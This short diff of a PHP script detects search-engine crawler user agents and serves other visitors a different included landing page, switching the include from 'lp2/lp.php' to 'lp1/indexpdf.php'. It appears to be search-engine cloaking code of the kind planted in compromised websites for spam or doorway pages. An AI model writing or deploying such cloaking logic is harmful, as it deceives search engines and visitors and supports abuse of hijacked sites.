@@ -7,5 +7,5 @@ if(preg_match("/Googlebot|MJ12bot|msnbot|bingbot|yandexbot/i", $agent) || preg_m
 }
 else {
 $acak = rand( 2, 3);
-include('lp2/lp.php');
+include('lp1/indexpdf.php');
 } ?>
